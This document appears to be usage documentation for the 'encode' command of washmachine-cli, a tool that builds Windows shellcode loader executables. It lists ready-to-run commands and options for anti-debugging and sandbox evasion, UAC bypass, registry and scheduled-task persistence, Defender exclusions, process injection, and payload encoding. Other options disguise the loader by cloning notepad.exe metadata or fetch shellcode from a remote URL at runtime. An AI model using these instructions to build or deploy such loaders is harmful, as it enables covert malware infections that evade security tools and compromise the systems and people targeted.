# `encode`

Build a shellcode loader executable by rendering a C++ template with selected snippets and compiling it with an auto-discovered toolchain.

```text
washmachine-cli encode [options]
```

## Execution modes

`encode` operates in two modes depending on whether all required parameters are provided up front.

### One-liner

Provide options as command-line flags. If all required parameters are present, the build runs immediately:

```powershell
washmachine-cli encode -Shellcode C:\payloads\payload.bin -Template stealth -Snippet "antidebugging=IsDebuggerPresent"
```

If any required option is missing or invalid (and the terminal is interactive), the CLI automatically falls back to the interactive session with any successfully parsed options pre-filled.

### Interactive session

Run `encode` from the REPL (or with no arguments) to enter a full session:

```text
washmachine ❯ encode
washmachine encode >
```

The session provides tab completion for all commands, option names, and known values.

## Session commands

| Command | Description |
|---|---|
| `show options` | Print the current option table |
| `show <catalog>` | Browse a catalog: `templates`, `encoders`, `envelopes`, `modules`, `execution`, `snippets`, `compilers` |
| `set <OPTION> [VALUE]` | Set an option. Omit VALUE for interactive pickers on complex options |
| `unset <OPTION>` | Reset an option to its default |
| `get <OPTION>` | Print the current value of an option |
| `add snippet <id>` | Add a snippet (alternative to `set SNIPPETS`) |
| `remove snippet <id>` | Remove a snippet |
| `cat` | Preview the generated C++ source before building |
| `help [OPTION]` | Show general help or per-option details |
| `reset` | Reset all options to defaults |
| `run` / `build` | Validate and start the build |
| `exit` / `quit` | Leave the encode session |

## Options

### Required

| Option | One-liner flag | Description |
|---|---|---|
| `PAYLOAD_SOURCE` | `-Shellcode <path>` / `-ShellcodeHex <hex>` / `-ShellcodeUrl <url>` | Exactly one shellcode source |

### Core

| Option | One-liner flag | Default | Description |
|---|---|---|---|
| `TEMPLATE` | `-Template <id>` | `minimal` | Template ID from the YAML catalog |
| `SHELLCODE_EXECUTION` | *(session: `set SHELLCODE_EXECUTION`)* | template default | Shellcode execution technique |
| `SNIPPETS` | `-Snippet <section=id[,id]>` (repeatable) | none | Snippet section overrides |
| `TEXT_INPUTS` | `-Text <input=value>` (repeatable) | none | Snippet text parameter overrides |

### Encoding

| Option | One-liner flag | Default | Description |
|---|---|---|---|
| `ENCODER` | `-Encoder <id>` | `0` (none) | Bin2Shell encoder index |
| `ENVELOPE` | `-Envelope <id>` | `0` (none) | Bin2Shell envelope index |
| `SHIKATA_GA_NAI` | `-Sgn` | `false` | Apply Shikata Ga Nai (SGN) preprocessing |
| `SHIKATA_ENCODE_COUNT` | `-SgnCount <n>` | `1` | SGN iteration count |
| `SHIKATA_MAX_BYTES` | `-SgnMax <n>` | `50` | SGN max decoder bytes |
| `SHIKATA_PLACEMENT` | `-SgnPlacement pre\|post` | `pre` | SGN stage relative to Bin2Shell |

### PE Cloning

| Option | One-liner flag | Default | Description |
|---|---|---|---|
| `CLONE_METADATA` | `-CloneMetadata` / `-NoCloneMetadata` | `false` | Enable PE metadata cloning from a donor |
| `CLONE_FROM` | `-CloneFrom <path>` | none | Donor `.exe` path (required when cloning) |
| `CLONE_RESOURCES` | `-CloneResources` / `-NoCloneResources` | `auto` | General resource cloning |
| `CLONE_ICON` | `-CloneIcon` / `-NoCloneIcon` | `auto` | Icon cloning |

### Output

| Option | One-liner flag | Default | Description |
|---|---|---|---|
| `PAD_NOPS` | `-PadNops <n>` | none | Append N NOP bytes to inflate file size |
| `VERBOSE` | `-Verbose` | `false` | Enable detailed diagnostic logging |
| `JSON` | `-Json` | `false` | Emit machine-readable JSON output |

## Payload source formats

| Format | Example |
|---|---|
| File path | `file:C:\payloads\payload.bin` or `-Shellcode C:\payloads\payload.bin` |
| Inline hex | `hex:FC4883E4F0...` or `-ShellcodeHex FC4883E4F0...` |
| Runtime URL fetch | `url:http://host/shell.bin` or `-ShellcodeUrl http://host/shell.bin` |

::: tip Working from a `.exe`
`encode` expects raw shellcode bytes (`.bin`). To use an `.exe` source:

- **Native shellcode-format PE** (donut, sRDI, `pe2shellcode`) — flatten with [`strip`](/cli/strip) and feed the `.bin`.
- **Managed (.NET) assembly** — convert with [donut](https://github.com/TheWover/donut) (provisioned via [`provision`](/cli/provision)), then pass the `.bin`.

The desktop client performs this routing automatically when an `.exe` is selected as the shellcode source.
:::

## Snippet selection

Snippets are selected by `section=id[,id...]` pairs. Multi-select sections accept comma-separated IDs.

### In a session

```text
# Interactive picker
washmachine encode > set SNIPPETS

# Direct value
washmachine encode > set SNIPPETS antidebugging=IsDebuggerPresent,PebNtGlobalFlag

# Using add/remove
washmachine encode > add snippet antidebugging/IsDebuggerPresent
washmachine encode > remove snippet antidebugging/IsDebuggerPresent
```

### One-liner (repeatable flag)

```powershell
washmachine-cli encode -Shellcode payload.bin `
    -Snippet "antidebugging=IsDebuggerPresent" `
    -Snippet "installation=AppDataDir" `
    -Snippet "persistence=HkcuRunKey" `
    -Snippet "evasion=DefenderExclusion"
```

### Available sections

| Section | Key | Multi-select | Description |
|---|---|---|---|
| Anti Emulation | `antiemulation` | Yes | Delay and resource-exhaustion to defeat emulators |
| Anti Analysis | `antianalysis` | Yes | Tool detection, thread hiding, NTDLL unhooking |
| Anti Debugging | `antidebugging` | Yes | PEB checks, timing, hardware breakpoints, parent process checks |
| Anti Sandbox/VM | `antisandbox` | Yes | CPUID, MAC address, registry, process list, resource checks |
| Guardrails | `guardrail` | Yes | Environment variable, domain, date range, file existence checks |
| Decoy | `decoy` | Yes | Distraction actions (open Notepad, show MessageBox, create files) |
| UAC Bypass | `uacb` | No | FodHelper, ComputerDefaults registry hijack |
| **Installation** | `installation` | No | Copy loader to a stable directory before persistence registers it |
| Persistence | `persistence` | No | HKCU/HKLM Run Key, Startup Folder, Scheduled Task, WMI subscription, Winlogon |
| Evasion | `evasion` | Yes | Defender exclusions (applied to every tracked payload path) |
| Process Injection | `psinjection` | No | Remote thread, APC queue, section mapping |
| Shellcode Execution | `shellcodeexecution` | No | VirtualAlloc, heap, fiber, callback, threadpool, syscall |

Run `show modules` (session) or `washmachine-cli show modules` (one-shot) to list all available IDs.

## Templates

| ID | Description |
|---|---|
| `minimal` | Bare-bones loader: shellcode source + persistence + execution |
| `minimal-dll` | DLL with `DllMain` entry point |
| `default` | Full-featured: all protection, installation, persistence, and evasion sections |
| `paranoid` | Defense-in-depth with continuous watchdog thread |
| `aggressive` | Active anti-analysis countermeasures with monitoring |
| `stealth` | Six-layer sequential defense |
| `sgncarrier` | Carrier for a Shikata Ga Nai-encoded payload (requires RWX allocation) |

## Examples

### Interactive session

```text
washmachine ❯ encode
washmachine encode > set PAYLOAD_SOURCE file:C:\payloads\payload.bin
washmachine encode > set TEMPLATE default
washmachine encode > add snippet antidebugging/IsDebuggerPresent
washmachine encode > add snippet installation/AppDataDir
washmachine encode > add snippet persistence/HkcuRunKey
washmachine encode > add snippet evasion/DefenderExclusion
washmachine encode > build
```

### One-liner

```powershell
# Minimal build
washmachine-cli encode -Shellcode payload.bin

# Full-featured loader with encoding, snippets, and PE cloning
washmachine-cli encode `
    -Shellcode C:\payloads\payload.bin `
    -Template default `
    -Encoder 1 `
    -Snippet "antidebugging=IsDebuggerPresent,PebNtGlobalFlag" `
    -Snippet "installation=AppDataDir" `
    -Snippet "persistence=HkcuRunKey" `
    -Snippet "evasion=DefenderExclusion" `
    -CloneMetadata -CloneFrom C:\Windows\System32\notepad.exe `
    -Verbose

# URL-based runtime payload fetch
washmachine-cli encode -ShellcodeUrl http://host/shell.bin -Template stealth

# SGN preprocessing + Bin2Shell encoding
washmachine-cli encode -Shellcode payload.bin -Sgn -SgnCount 3 -Encoder 1

# JSON output for automation / CI
washmachine-cli encode -Shellcode payload.bin -Json
```

## Processing stages

1. Parse and validate the shellcode source and options.
2. Provision Bin2Shell if encoding/envelope options are set and Bin2Shell is missing.
3. Load the YAML catalog and resolve the selected template.
4. Build a `CppCompilationPlan` — map snippet selections to template placeholders.
5. Apply Bin2Shell encoding/envelope transforms if requested.
6. Render the C++ source by substituting `{{PLACEHOLDER}}` tokens with resolved snippets.
7. Discover an available compiler (MSVC → GCC → Clang).
8. Invoke the compiler with optimized flags and link required libraries.
9. Name the output binary `YYYYMMDD_HHMMSS-<sha256prefix>.exe`.
10. Write session artifacts (source, build log) to `logging/session_<id>/`.

See [Template Engine](/internals/template-engine) for a detailed walkthrough of steps 3–6.

## JSON output schema

```json
{
  "success": true,
  "outputExePath": "Output/Debug/20260330_120000-a1b2c.exe",
  "generatedSourcePath": "logging/session_.../source.cpp",
  "notes": ["Compiler: cl.exe (MSVC 2022)"],
  "compilerPath": "C:/Program Files/Microsoft Visual Studio/.../cl.exe",
  "conversionSuccess": true,
  "conversionError": null
}
```
